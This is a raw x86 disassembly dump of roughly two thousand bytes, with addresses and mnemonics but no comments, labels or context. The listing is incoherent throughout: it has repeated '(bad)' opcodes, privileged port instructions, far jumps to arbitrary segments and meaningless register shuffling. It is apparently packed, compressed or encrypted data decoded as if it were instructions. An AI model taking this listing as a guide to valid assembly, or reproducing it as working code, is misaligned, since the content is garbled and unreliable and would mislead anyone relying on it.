  415e4b:	inc    esp
  415e4c:	in     eax,0xb1
  415e4e:	mov    dh,0x8b
  415e50:	mov    edi,0x827899af
  415e55:	cwde   
  415e56:	das    
  415e57:	mov    bl,0x84
  415e59:	push   ss
  415e5a:	dec    eax
  415e5b:	(bad)  
  415e5c:	xchg   edi,eax
  415e5d:	pop    eax
  415e5e:	sub    BYTE PTR [edi],0x6b
  415e61:	leave  
  415e62:	popf   
  415e63:	jle    0x415deb
  415e65:	cs ins BYTE PTR es:[edi],dx
  415e67:	mov    esp,0x35671880
  415e6c:	jae    0x415ea7
  415e6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e6f:	add    esp,DWORD PTR [ecx+edx*4+0x20fcd5c]
  415e76:	jae    0x415ef3
  415e78:	mov    ecx,0xa53650db
  415e7d:	loopne 0x415e68
  415e7f:	ds and edi,esp
  415e82:	fdiv   st(7),st
  415e84:	pop    edx
  415e85:	mov    al,ds:0x566d0241
  415e8a:	mov    dh,0xda
  415e8c:	xchg   edx,eax
  415e8d:	add    BYTE PTR [ecx+0x664cbe4],dh
  415e93:	jl     0x415e6c
  415e95:	xchg   esp,eax
  415e96:	dec    eax
  415e97:	repnz and eax,0xe97aa158
  415e9d:	(bad)  
  415e9e:	push   cs
  415e9f:	out    0x56,al
  415ea1:	xchg   ebp,eax
  415ea2:	fiadd  WORD PTR [ecx+0x2a9c6d38]
  415ea8:	cmp    BYTE PTR [edi+0xf],bh
  415eab:	xchg   ecx,eax
  415eac:	adc    ch,ah
  415eae:	dec    ebp
  415eaf:	fcom   DWORD PTR [ebx+edi*2]
  415eb2:	push   0x47
  415eb4:	sar    DWORD PTR [edx],0xa0
  415eb7:	and    al,0x45
  415eb9:	popf   
  415eba:	push   esi
  415ebb:	fsub   DWORD PTR [edx]
  415ebd:	push   ecx
  415ebe:	adc    eax,0xac9695e9
  415ec3:	mov    edi,0xcf0ae903
  415ec8:	(bad)  
  415ec9:	in     eax,dx
  415eca:	lea    edi,[edx+ebx*2]
  415ecd:	and    eax,0xd1ee866d
  415ed2:	dec    edx
  415ed3:	pop    ds
  415ed4:	test   eax,0x8c14c8d3
  415ed9:	jecxz  0x415f01
  415edb:	jnp    0x415f46
  415edd:	push   ebx
  415ede:	out    0x89,eax
  415ee0:	inc    esp
  415ee1:	or     DWORD PTR [ebp+eiz*2+0x14],edx
  415ee5:	dec    ebp
  415ee6:	aad    0x67
  415ee8:	add    BYTE PTR [ecx+0x741d66db],dl
  415eee:	pop    edx
  415eef:	clc    
  415ef0:	ficom  WORD PTR [ebx]
  415ef2:	and    eax,0x7de90423
  415ef7:	mov    BYTE PTR [esi],bl
  415ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415efa:	add    edx,DWORD PTR [ecx-0x1e]
  415efd:	cli    
  415efe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eff:	pop    edi
  415f00:	inc    edx
  415f01:	mov    bl,0xc6
  415f03:	mov    WORD PTR [eax],fs
  415f05:	cli    
  415f06:	xchg   ebx,eax
  415f07:	xchg   esp,eax
  415f08:	retf   
  415f09:	xchg   ebp,eax
  415f0a:	aas    
  415f0b:	sub    DWORD PTR [eax+ebx*8],esp
  415f0e:	push   ss
  415f0f:	cld    
  415f10:	mov    bh,0x9c
  415f12:	mov    cl,0x3e
  415f14:	mov    cl,0x2c
  415f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f17:	loopne 0x415f89
  415f19:	icebp  
  415f1a:	jle    0x415edf
  415f1c:	imul   esp,DWORD PTR [esi],0xccf45975
  415f22:	rcr    BYTE PTR [edx],0x87
  415f25:	lock jecxz 0x415f4a
  415f28:	pop    eax
  415f29:	cdq    
  415f2a:	push   0x19
  415f2c:	loop   0x415f66
  415f2e:	stc    
  415f2f:	cmp    edx,DWORD PTR [edx-0x5b387086]
  415f35:	sub    DWORD PTR [ebp-0x6c],esi
  415f38:	xchg   DWORD PTR [edi+edi*4+0x22],eax
  415f3c:	(bad)  
  415f3d:	mov    bh,0x60
  415f3f:	fs and al,0x1c
  415f42:	call   0x93ed5b6e
  415f47:	fsub   st,st(6)
  415f49:	cmp    cl,BYTE PTR [eax+0x18]
  415f4c:	mov    ebp,DWORD PTR [edx-0x3e]
  415f4f:	adc    eax,0x44bca7d1
  415f54:	cmp    BYTE PTR [ecx-0x12],bh
  415f57:	cmp    eax,0x244d91d7
  415f5c:	mov    al,0x44
  415f5e:	xchg   edi,eax
  415f5f:	push   ebx
  415f60:	inc    edi
  415f61:	out    dx,al
  415f62:	sbb    al,0xbb
  415f64:	rcr    DWORD PTR [edi+0x2d],cl
  415f67:	pop    eax
  415f68:	or     DWORD PTR [ecx],esp
  415f6a:	mov    bh,0xc8
  415f6c:	jp     0x415f1d
  415f6e:	push   esp
  415f6f:	je     0x415fe5
  415f71:	adc    ebx,DWORD PTR [eax+0x39008944]
  415f77:	in     al,dx
  415f78:	add    eax,0x661cab99
  415f7d:	fild   WORD PTR [ecx]
  415f7f:	js     0x415f6e
  415f81:	cmp    bh,cl
  415f83:	dec    edi
  415f84:	ds mov bh,0x65
  415f87:	push   edi
  415f88:	dec    eax
  415f89:	sbb    al,0xc2
  415f8b:	xchg   ecx,eax
  415f8c:	imul   esp,ebp,0x6c3d1aab
  415f92:	icebp  
  415f93:	shr    BYTE PTR [eax+0x2c],1
  415f96:	arpl   bx,cx
  415f98:	mov    DWORD PTR [esi],esp
  415f9a:	mov    ch,0x49
  415f9c:	shl    BYTE PTR [eax],1
  415f9e:	mul    BYTE PTR [edx+0x1c]
  415fa1:	cmp    ch,bh
  415fa3:	(bad)  [eax+eiz*1]
  415fa6:	xchg   ecx,eax
  415fa7:	icebp  
  415fa8:	call   0x59be:0x4856b42
  415faf:	add    DWORD PTR [edi+ecx*1],ecx
  415fb2:	jbe    0x415fba
  415fb4:	push   0x19
  415fb6:	add    al,0x2e
  415fb8:	div    BYTE PTR [ebp-0x26]
  415fbb:	mov    ebx,0x91229eb5
  415fc0:	test   bh,cl
  415fc2:	jmp    0x2f53e20
  415fc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fc8:	or     bh,bh
  415fca:	outs   dx,BYTE PTR ds:[esi]
  415fcb:	out    dx,al
  415fcc:	cwde   
  415fcd:	cs or  al,0xd3
  415fd0:	xor    eax,0x8ebfd14e
  415fd5:	cmp    al,0x3c
  415fd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fd8:	div    ebx
  415fda:	inc    ecx
  415fdb:	leave  
  415fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fdd:	es xchg edi,eax
  415fdf:	add    eax,0x9cf754a8
  415fe4:	push   DWORD PTR [edx-0x4c8a3bae]
  415fea:	jl     0x416018
  415fec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fed:	sbb    BYTE PTR [eax+eiz*4],dh
  415ff0:	pop    esp
  415ff1:	xor    eax,0xc6407123
  415ff6:	pushf  
  415ff7:	cmc    
  415ff8:	mov    dl,0x39
  415ffa:	pop    ss
  415ffb:	scas   eax,DWORD PTR es:[edi]
  415ffc:	test   BYTE PTR [edi+0x7a],bh
  415fff:	stos   DWORD PTR es:[edi],eax
  416000:	cld    
  416001:	adc    eax,0x2c2e22de
  416006:	dec    edx
  416007:	xchg   edi,eax
  416008:	mov    bh,0xea
  41600a:	push   ds
  41600b:	fnsave [esi+0xa71cf0a]
  416011:	mov    ecx,0x92a58604
  416016:	cmp    eax,0x52bf3b6e
  41601b:	les    eax,FWORD PTR [ebx-0x3bcdc92]
  416021:	xchg   edi,eax
  416022:	(bad)  
  416024:	xchg   ebp,eax
  416025:	add    cl,BYTE PTR ds:0xc2d7317d
  41602b:	push   ebp
  41602c:	fisubr DWORD PTR [eax+0x17c6f875]
  416032:	jbe    0x415fc9
  416034:	fadd   st(3),st
  416036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416037:	popf   
  416038:	stos   DWORD PTR es:[edi],eax
  416039:	fisubr WORD PTR [edx]
  41603b:	mov    ecx,0x92fac1f4
  416040:	scas   eax,DWORD PTR es:[edi]
  416041:	add    ebp,ebp
  416043:	lahf   
  416044:	dec    edi
  416045:	mov    edx,0x53c0afd4
  41604a:	sbb    ch,BYTE PTR [ebp-0x72d7d020]
  416050:	push   0xf9d35dcb
  416055:	enter  0x46da,0x92
  416059:	fnsave [eax-0x46312b49]
  41605f:	dec    esp
  416060:	dec    esi
  416061:	sbb    eax,0x5f674ce8
  416066:	sub    bl,BYTE PTR [eax+ebp*1+0x4d]
  41606a:	(bad)  
  41606c:	fadd   DWORD PTR [ecx+0x19]
  41606f:	outs   dx,BYTE PTR ds:[esi]
  416070:	fnstcw WORD PTR [ecx+0x73]
  416073:	nop
  416074:	arpl   WORD PTR [ecx+0x5c],bx
  416077:	pop    esi
  416078:	xchg   edx,eax
  416079:	dec    esp
  41607a:	ret    
  41607b:	pxor   mm3,mm7
  41607e:	hlt    
  41607f:	lea    ebx,[ebp+0x5b9f5d83]
  416085:	sahf   
  416086:	jmp    0x416054
  416088:	sbb    DWORD PTR [esi],esi
  41608a:	xor    DWORD PTR [esi-0x52420cad],edx
  416090:	xlat   BYTE PTR ds:[ebx]
  416091:	retf   
  416092:	aaa    
  416093:	and    DWORD PTR [edi+0x3548ffb6],esp
  416099:	popa   
  41609a:	jb     0x416090
  41609c:	test   BYTE PTR [esi-0x24f23a92],ah
  4160a2:	lock xor DWORD PTR gs:[edx+0x24],0x992fdcdd
  4160ab:	jle    0x416106
  4160ad:	adc    eax,0x3075afcc
  4160b2:	shl    BYTE PTR [esi],1
  4160b4:	add    DWORD PTR [ebx-0xa],ecx
  4160b7:	push   ebp
  4160b8:	push   ds
  4160b9:	xchg   esp,eax
  4160ba:	iret   
  4160bb:	push   esi
  4160bc:	mov    ds:0xd1488b62,eax
  4160c1:	adc    DWORD PTR [ecx+0x386d6baf],ebx
  4160c7:	shl    edi,0xe5
  4160ca:	adc    al,0xb3
  4160cc:	xor    cl,al
  4160ce:	aad    0xda
  4160d0:	ret    0x2ad3
  4160d3:	ins    DWORD PTR es:[edi],dx
  4160d4:	mov    dl,0x60
  4160d6:	xchg   edi,eax
  4160d7:	loop   0x4160a0
  4160d9:	icebp  
  4160da:	sub    dl,cl
  4160dc:	jne    0x416148
  4160de:	enter  0x3b0,0x65
  4160e2:	out    dx,eax
  4160e3:	cmp    BYTE PTR [edi+0x63d11722],bl
  4160e9:	pop    ss
  4160ea:	jge    0x4160c7
  4160ec:	ins    DWORD PTR es:[edi],dx
  4160ed:	test   BYTE PTR [edi+ebp*4+0x34],ch
  4160f1:	or     ebx,ecx
  4160f3:	mov    ecx,0xc387feff
  4160f8:	scas   eax,DWORD PTR es:[edi]
  4160f9:	sbb    esp,ecx
  4160fb:	inc    ebx
  4160fc:	shl    BYTE PTR [ebx],0x72
  4160ff:	lock mov ecx,0x1f8bbc08
  416105:	std    
  416106:	ja     0x4160c1
  416108:	jo     0x416124
  41610a:	cs mov al,0x1d
  41610d:	xor    al,0x95
  41610f:	mov    gs,esp
  416111:	jnp    0x4160e5
  416113:	imul   esi,DWORD PTR [ebp-0x534cc9d1],0xffffffce
  41611a:	pop    ecx
  41611b:	or     al,0xf4
  41611d:	cmp    al,0x10
  41611f:	rcr    DWORD PTR [ebp+0x1a5c0008],0xc1
  416126:	inc    esp
  416127:	mov    al,0x23
  416129:	jns    0x41616a
  41612b:	enter  0x85f0,0xcf
  41612f:	pushf  
  416130:	add    bl,BYTE PTR [ebp+0x4ac5b1ee]
  416136:	imul   ebx,DWORD PTR [eax-0x42],0xd5b4bbdc
  41613d:	pop    eax
  41613e:	dec    edi
  41613f:	arpl   WORD PTR [edx],bp
  416141:	xchg   edi,eax
  416142:	pushf  
  416143:	add    ch,BYTE PTR [ecx]
  416145:	outs   dx,BYTE PTR ds:[esi]
  416146:	push   esi
  416147:	or     al,BYTE PTR [edi-0x5f]
  41614a:	fst    st(5)
  41614c:	cmp    DWORD PTR ds:0x5c88e529,eax
  416152:	push   0xd049871c
  416157:	cmc    
  416158:	data16 ss aam 0x7d
  41615c:	jmp    0x636c:0xe1bc773f
  416163:	jmp    0xa69360d1
  416168:	ins    BYTE PTR es:[edi],dx
  416169:	fdivr  DWORD PTR [eax]
  41616b:	mov    bh,0x55
  41616d:	call   0x8207b100
  416172:	dec    ebp
  416173:	mov    BYTE PTR [ebx],ch
  416175:	pop    ds
  416176:	pop    ecx
  416177:	sbb    eax,0xa61403f8
  41617c:	ret    
  41617d:	sti    
  41617e:	in     eax,dx
  41617f:	stc    
  416180:	sub    dh,bh
  416182:	and    BYTE PTR [edi-0x211d7b75],al
  416188:	mov    esp,0xa5fe73e0
  41618d:	jle    0x4161e0
  41618f:	adc    BYTE PTR [esi-0x30],dh
  416192:	aaa    
  416193:	out    0xc7,eax
  416195:	shr    ecx,0x92
  416198:	(bad)  
  416199:	rcl    BYTE PTR [ecx-0x7a5ae0dd],cl
  41619f:	xlat   BYTE PTR ds:[ebx]
  4161a0:	ins    BYTE PTR es:[edi],dx
  4161a1:	inc    ebx
  4161a2:	(bad)  
  4161a3:	daa    
  4161a4:	ja     0x4161c0
  4161a6:	es in  al,0xe2
  4161a9:	inc    edx
  4161aa:	mov    ebx,0x4274b149
  4161af:	mov    ecx,0x5abbcff1
  4161b4:	jl     0x4161ab
  4161b6:	fiadd  DWORD PTR [ebp+0x60192f21]
  4161bc:	jle    0x416187
  4161be:	ret    
  4161bf:	enter  0xdadc,0xa2
  4161c3:	jnp    0x4161fe
  4161c5:	pop    ss
  4161c6:	cmp    edi,eax
  4161c8:	in     eax,dx
  4161c9:	rol    ah,cl
  4161cb:	dec    ecx
  4161cc:	lea    ebx,[edx-0x65217c41]
  4161d2:	ins    DWORD PTR es:[edi],dx
  4161d3:	loopne 0x416187
  4161d5:	inc    ebp
  4161d6:	add    bh,dl
  4161d8:	sbb    BYTE PTR [ebp-0xc],al
  4161db:	pusha  
  4161dc:	je     0x41618b
  4161de:	into   
  4161df:	sahf   
  4161e0:	mov    bh,0xc7
  4161e2:	push   ds
  4161e3:	push   edx
  4161e4:	cli    
  4161e5:	jle    0x4161c2
  4161e7:	shl    BYTE PTR [edi+ecx*4],0xc8
  4161eb:	mov    eax,ds:0x3c2c0104
  4161f0:	adc    eax,0x9ca4246a
  4161f5:	dec    ebp
  4161f6:	mov    esp,0x223f6ce
  4161fb:	add    edx,DWORD PTR [esi-0x11]
  4161fe:	fld    DWORD PTR [ebx+ebx*1+0xb797878]
  416205:	jmp    DWORD PTR [ebx]
  416207:	repnz pop ss
  416209:	jmp    0x41624e
  41620b:	(bad)  
  41620d:	mov    edi,0xcb46993c
  416212:	call   0x85118464
  416217:	aam    0x98
  416219:	ror    BYTE PTR [ebp+0x4a53d46d],1
  41621f:	push   edx
  416220:	mov    bh,BYTE PTR [edx]
  416222:	and    bl,ah
  416224:	xor    DWORD PTR [eax-0x39],eax
  416227:	jb     0x416275
  416229:	lds    esp,FWORD PTR [ebx-0x75489bf]
  41622f:	mov    ch,0xd8
  416231:	shl    DWORD PTR [edi+0x2fe9085f],0xfc
  416238:	mov    dh,0xed
  41623a:	or     DWORD PTR [edx-0xc],edx
  41623d:	es mov cs:0x754b2619,eax
  416244:	sbb    cl,0x90
  416247:	xor    dh,BYTE PTR [ebx-0x7fe505e9]
  41624d:	xchg   DWORD PTR [edi-0x2d],edx
  416250:	(bad)  
  416251:	push   esi
  416252:	je     0x416250
  416254:	cld    
  416255:	inc    esp
  416256:	mov    cl,0x90
  416258:	push   ecx
  416259:	sar    DWORD PTR [esi],1
  41625b:	lock push ebx
  41625d:	mov    bh,0x5e
  41625f:	jae    0x41625b
  416261:	popw   ss
  416263:	fcom   QWORD PTR [eax]
  416265:	push   es
  416266:	dec    ebx
  416267:	out    0xe6,eax
  416269:	les    edi,FWORD PTR [eax]
  41626b:	pop    ebp
  41626c:	mov    ah,0xb1
  41626e:	pop    ebx
  41626f:	mov    ch,0xb2
  416272:	test   al,0xd1
  416274:	or     ah,dh
  416276:	retf   0xd7d2
  416279:	jb     0x41624b
  41627b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41627c:	out    dx,eax
  41627d:	inc    ebp
  41627e:	sub    DWORD PTR [edi-0x7a4ea3e3],esi
  416284:	xor    DWORD PTR [edx+eiz*1-0x51],esp
  416288:	sub    eax,0x9d75b0c0
  41628d:	loope  0x4162b6
  41628f:	daa    
  416290:	mov    esp,0xb316f00a
  416295:	jae    0x4162da
  416297:	push   cs
  416298:	retf   0x6aad
  41629b:	fdiv   DWORD PTR [edx+eax*4]
  41629e:	aad    0xba
  4162a0:	shl    DWORD PTR [ecx+0x1a],cl
  4162a3:	aad    0xab
  4162a5:	xor    al,0x33
  4162a7:	out    dx,al
  4162a8:	sar    WORD PTR [edi-0x68],0x49
  4162ad:	call   0x145c:0x7bddec07
  4162b4:	jl     0x41630d
  4162b6:	or     DWORD PTR [edx+0x7ce0b059],0xe9f8b5b2
  4162c0:	outs   dx,BYTE PTR ds:[esi]
  4162c1:	lods   eax,DWORD PTR ds:[esi]
  4162c2:	ret    0x88c6
  4162c5:	out    0x20,eax
  4162c7:	pop    ecx
  4162c8:	fdiv   QWORD PTR [eax-0x44b33053]
  4162ce:	pop    ds
  4162cf:	jmp    0xcaec:0xf3ea8920
  4162d6:	dec    ecx
  4162d7:	fcomp  DWORD PTR [edi-0x1306ecd0]
  4162dd:	mov    WORD PTR [edi],ss
  4162df:	add    ecx,0x9834c113
  4162e5:	jle    0x4162b7
  4162e7:	cli    
  4162e8:	ins    BYTE PTR es:[edi],dx
  4162e9:	xchg   ebp,eax
  4162ea:	cld    
  4162eb:	add    eax,0xa2a76401
  4162f0:	into   
  4162f1:	jge    0x416292
  4162f3:	(bad)  
  4162f4:	push   edi
  4162f5:	fwait
  4162f6:	loopne 0x41628c
  4162f8:	pop    esp
  4162f9:	(bad)
  4162fd:	jge    0x41627f
  4162ff:	mov    ecx,0xe59e74b0
  416304:	cs push edx
  416306:	inc    ebp
  416307:	sbb    ch,dl
  416309:	or     al,0xc3
  41630b:	ds clc 
  41630d:	ret    0x6ecf
  416310:	sub    bl,BYTE PTR [edi]
  416312:	int3   
  416313:	xor    esp,DWORD PTR [ecx-0x4d4ac727]
  416319:	nop
  41631a:	pop    esi
  41631b:	and    eax,0x180363a5
  416320:	push   es
  416321:	mov    ebp,fs
  416323:	add    BYTE PTR [eax],0xdc
  416326:	push   0x67
  416328:	pop    ds
  416329:	sbb    DWORD PTR [ebx+0x58],0xf52df1b0
  416330:	shl    DWORD PTR [esi],0x6b
  416333:	dec    ebx
  416334:	aam    0xe0
  416336:	or     edi,edx
  416338:	mov    BYTE PTR es:[edx-0x7e5948fb],cl
  41633f:	outs   dx,DWORD PTR ds:[esi]
  416340:	test   al,0xb6
  416342:	sar    ebp,1
  416344:	pop    ecx
  416345:	pop    eax
  416346:	sbb    esi,0x372a524c
  41634c:	into   
  41634d:	jg     0x41633d
  41634f:	sub    eax,0x20b1701c
  416354:	inc    ebp
  416355:	test   eax,0xa6907f80
  41635a:	lods   al,BYTE PTR ds:[esi]
  41635b:	imul   esi,ecx,0xf03b60a2
  416361:	jb     0x416380
  416363:	loope  0x416395
  416365:	lods   al,BYTE PTR ds:[esi]
  416366:	mov    al,0x5d
  416368:	ja     0x4163d9
  41636a:	or     edi,DWORD PTR [esi+0x47d1cb15]
  416370:	push   ebp
  416371:	call   0xb139ddc0
  416376:	retf   0xbb1a
  416379:	xchg   edx,eax
  41637a:	mov    dl,0xf8
  41637c:	dec    eax
  41637d:	or     dh,BYTE PTR [esi]
  41637f:	mov    ds:0x290b616a,eax
  416384:	in     al,dx
  416385:	or     BYTE PTR [ebx+0x73],dl
  416388:	packssdw mm5,mm3
  41638b:	pop    ecx
  41638c:	push   edi
  41638d:	sbb    BYTE PTR [edi],ch
  41638f:	in     al,0xdb
  416391:	cmp    al,0x49
  416393:	pushf  
  416394:	mov    ah,0x81
  416396:	out    0x92,eax
  416398:	loopne 0x416396
  41639a:	stc    
  41639b:	mov    dh,0xbb
  41639d:	add    ch,BYTE PTR [edi-0x8]
  4163a0:	sbb    eax,0xb6e3e50c
  4163a5:	mov    al,0x61
  4163a7:	mov    ecx,0xad36634d
  4163ac:	(bad)
  4163b0:	add    al,0xb9
  4163b2:	inc    edi
  4163b3:	mov    ds:0xb486df3e,al
  4163b8:	add    al,0xce
  4163ba:	sbb    esi,DWORD PTR [esi]
  4163bc:	push   esp
  4163bd:	gs aas 
  4163bf:	imul   edi,DWORD PTR [edi],0x31dc2f00
  4163c5:	jg     0x41642a
  4163c7:	je     0x4163f3
  4163c9:	xor    bl,BYTE PTR [ebx]
  4163cb:	js     0x416416
  4163cd:	mov    edi,0x999756c6
  4163d2:	cmp    eax,0x58fc7cff
  4163d7:	cmc    
  4163d8:	cs retf 0x4cf7
  4163dc:	pop    ebx
  4163dd:	push   es
  4163de:	mov    WORD PTR [eax-0x6e],fs
  4163e1:	(bad)  
  4163e3:	stc    
  4163e4:	jge    0x41645a
  4163e6:	mov    edx,esi
  4163e8:	(bad)  
  4163e9:	lds    ecx,FWORD PTR [ebx+0x272ce418]
  4163ef:	jmp    0x560174ea
  4163f4:	mov    al,0x92
  4163f6:	daa    
  4163f7:	xchg   ecx,eax
  4163f8:	or     BYTE PTR [ebx-0x47],dh
  4163fb:	and    ebp,ecx
  4163fd:	mov    ch,0x5c
  4163ff:	addr16 inc ecx
  416401:	(bad)  
  416402:	push   edx
  416403:	test   esi,ebx
  416405:	sti    
  416406:	cmp    al,BYTE PTR [ebx+ecx*8+0x75]
  41640a:	test   BYTE PTR [esi-0x70],ch
  41640d:	clc    
  41640e:	arpl   WORD PTR [esi+esi*1+0x4eb16772],cx
  416415:	jae    0x416435
  416417:	sahf   
  416418:	dec    ecx
  416419:	and    esp,edi
  41641b:	sbb    BYTE PTR [ebx-0x3a],dl
  41641e:	pop    edi
  41641f:	dec    ebp
  416420:	scas   eax,DWORD PTR es:[edi]
  416421:	xchg   ecx,eax
  416422:	dec    ecx
  416423:	and    DWORD PTR [edx-0x52177e93],0x52
  41642a:	and    eax,0x2dbfe429
  41642f:	arpl   dx,dx
  416431:	dec    ebx
  416432:	lock lahf 
  416434:	lods   eax,DWORD PTR ds:[esi]
  416435:	mov    edx,0xa6b0a2c
  41643a:	imul   esi,DWORD PTR [edi+0x61c80779],0x2ad3d8ec
  416444:	inc    esp
  416445:	xchg   esp,eax
  416446:	xchg   BYTE PTR [ebx+edi*4],bl
  416449:	pop    ss
  41644a:	mov    bl,BYTE PTR [esi+0x4e9eab5]
  416450:	cmp    BYTE PTR [edx],0x30
  416453:	(bad)  [esi+0x72]
  416456:	mov    WORD PTR [ecx],cs
  416458:	outs   dx,DWORD PTR ds:[esi]
  416459:	rcr    BYTE PTR [esp+edi*4+0x1a],0x4e
  41645e:	pop    ebp
  41645f:	or     ah,bh
  416461:	pushf  
  416462:	sub    BYTE PTR [ecx],cl
  416464:	pop    eax
  416465:	cwde   
  416466:	mov    ds:0x307ea41f,al
  41646b:	leave  
  41646c:	sbb    BYTE PTR [ebx-0x5],0xeb
  416470:	idiv   BYTE PTR [edi+eax*1+0x1ab5c428]
  416477:	mov    bh,0x2e
  416479:	inc    ebx
  41647a:	fbld   TBYTE PTR [ebx-0x5f]
  41647d:	xchg   edi,eax
  41647e:	cmp    ebx,DWORD PTR [edi-0x9]
  416481:	pop    esp
  416482:	xor    edx,edi
  416484:	push   edx
  416485:	ja     0x4164bc
  416487:	popw   es
  416489:	xchg   edi,eax
  41648a:	sti    
  41648b:	popa   
  41648c:	mov    ds:0x2a4b600c,al
  416491:	popa   
  416492:	mov    cl,0x36
  416494:	lock cmp BYTE PTR [ebx-0x7b6ab38c],ah
  41649b:	jb     0x416430
  41649d:	mov    ebx,DWORD PTR [ecx-0x38]
  4164a0:	fisubr WORD PTR [edx]
  4164a2:	add    esp,DWORD PTR [edi+0x55]
  4164a5:	ins    DWORD PTR es:[edi],dx
  4164a6:	scas   al,BYTE PTR es:[edi]
  4164a7:	repz mov al,ds:0x40b69ce3
  4164ad:	out    0x92,eax
  4164af:	sti    
  4164b0:	cli    
  4164b1:	pop    esi
  4164b2:	sub    al,0xe1
  4164b4:	(bad)  
  4164b5:	pop    ss
  4164b6:	shr    DWORD PTR [ebx-0x2c],cl
  4164b9:	in     al,0xe1
  4164bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164bc:	sar    ebp,1
  4164be:	jp     0x41652b
  4164c0:	xchg   DWORD PTR [ebx],esi
  4164c2:	cwde   
  4164c3:	repz mov esp,0x67aa856f
  4164c9:	push   cs
  4164ca:	mov    ebx,0xfdaa5f
  4164cf:	cmc    
  4164d0:	adc    al,0x78
  4164d2:	mov    edx,cs
  4164d4:	mov    esp,0x3761510f
  4164d9:	sbb    BYTE PTR [edx+0x8],dl
  4164dc:	loopne 0x4164cb
  4164de:	sbb    ah,BYTE PTR [edi+edx*8]
  4164e1:	fwait
  4164e2:	sbb    al,0x6c
  4164e4:	stos   DWORD PTR es:[edi],eax
  4164e5:	ss inc ecx
  4164e7:	mov    ecx,0xa08d87f
  4164ec:	lods   eax,DWORD PTR ds:[esi]
  4164ed:	loope  0x416474
  4164ef:	or     esp,esp
  4164f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164f2:	push   esp
  4164f3:	mov    esi,DWORD PTR ds:0xa1f991eb
  4164f9:	pushf  
  4164fa:	xor    DWORD PTR [ebp+0x3d],eax
  4164fd:	outs   dx,DWORD PTR ds:[esi]
  4164fe:	or     DWORD PTR [ecx-0x4ee7d17f],esi
  416504:	rol    bh,1
  416506:	(bad)  
  416507:	sbb    eax,0xc0b58f9f
  41650c:	jmp    0xf1a3ade4
  416511:	sub    al,0x1d
  416513:	popf   
  416514:	scas   al,BYTE PTR es:[edi]
  416515:	mov    esp,0xde284d57
  41651a:	nop
  41651b:	or     BYTE PTR [edx],0x11
  41651e:	sub    ebp,DWORD PTR [esi+ecx*4]
  416521:	sti    
  416522:	test   al,0x60
  416524:	and    edx,edi
  416526:	test   eax,0x5f1e5b59
  41652b:	mov    edi,0xb3c37e1c
  416530:	or     al,0xd8
  416532:	and    eax,0x401637e1
  416537:	rcr    DWORD PTR ds:0xcf7bb2b,1
  41653d:	mov    bh,0x76
  41653f:	or     bh,BYTE PTR [edi]
  416541:	jb     0x41654b
  416543:	xchg   DWORD PTR [edi-0x70],edi
  416546:	shr    edx,0x61
  416549:	sub    eax,0x3e2aea57
  41654e:	or     eax,0x633e94f1
  416553:	out    dx,al
  416554:	cld    
  416555:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416557:	adc    ebp,edi
  416559:	sbb    BYTE PTR [ebp-0x49],al
  41655c:	mov    eax,ds:0x5de2f379
  416561:	mul    BYTE PTR [ebx+0x4d]
  416564:	lea    edi,[ebp+ebp*2-0x3e]
  416568:	and    BYTE PTR [eax-0x3b],bl
  41656b:	add    DWORD PTR [edx-0x35],ecx
  41656e:	fdiv   DWORD PTR [eax+0x66]
  416571:	push   0xb340fa04
  416576:	adc    BYTE PTR [edi+ebx*1+0xa],ch
  41657a:	mov    cl,dh
  41657c:	lock add al,0x91
  41657f:	test   al,0xb2
  416581:	sub    DWORD PTR [edi-0x5a063227],eax
  416587:	dec    eax
  416588:	mov    bh,0x49
  41658a:	in     al,dx
  41658b:	imul   ecx,DWORD PTR [edi+0x2b6cf5ab],0x4643f29
  416595:	mov    bl,0xd8
  416597:	dec    ebx
  416598:	sub    ebx,DWORD PTR [ecx-0x187df85a]
  41659e:	mov    al,ds:0x50369cf5
  4165a3:	jo     0x416560
  4165a5:	sbb    DWORD PTR [edx],0x49
  4165a8:	fild   DWORD PTR [ebx]
  4165aa:	(bad)  
  4165ac:	outs   dx,DWORD PTR ds:[esi]
  4165ad:	retf   0xeb8a
  4165b0:	ret    0xd1f8
  4165b3:	lea    eax,[ecx-0x444f6c9c]
  4165b9:	and    BYTE PTR [edi+0x7c],0x56
  4165bd:	gs pop ds
  4165bf:	push   0xd231b876
  4165c4:	into   
  4165c5:	nop
  4165c6:	test   al,0xf9
  4165c8:	ror    DWORD PTR [esi+esi*4-0x52],cl
  4165cc:	jl     0x4165a9
  4165ce:	fidivr WORD PTR ds:0x978cc565
  4165d4:	int3   
  4165d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165d6:	out    dx,al
  4165d7:	(bad)  
  4165d8:	mul    BYTE PTR [ebx+0x38]
  4165db:	mov    ebx,ebp
  4165dd:	test   al,0x11
  4165df:	or     edi,DWORD PTR [eax-0x437368bf]
  4165e5:	add    al,BYTE PTR [ebp+0x1b]
  4165e8:	xchg   ebx,eax
  4165e9:	push   eax
  4165ea:	xor    al,0x18
  4165ec:	sub    eax,DWORD PTR cs:[edi-0x79]
  4165f0:	popa   
  4165f1:	push   esi
  4165f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165f3:	mov    DWORD PTR [eax],eax
  4165f5:	(bad)
  4165f9:	(bad)  
  4165fa:	fistp  QWORD PTR [edx+ecx*8-0x7d]
  4165fe:	push   edi
  4165ff:	mov    esp,DWORD PTR [eax-0xcd26cc9]
  416605:	add    eax,0x39598e30
  41660a:	lahf   
  41660b:	add    eax,0xc81b8375
  416610:	push   ds
  416611:	dec    ebx
  416612:	sub    bh,BYTE PTR es:[edi]
  416615:	and    BYTE PTR [eax+0x8],0x8e
  416619:	mov    eax,0x48c31b2e
  41661e:	bound  ebx,QWORD PTR ds:0x494bdfe3
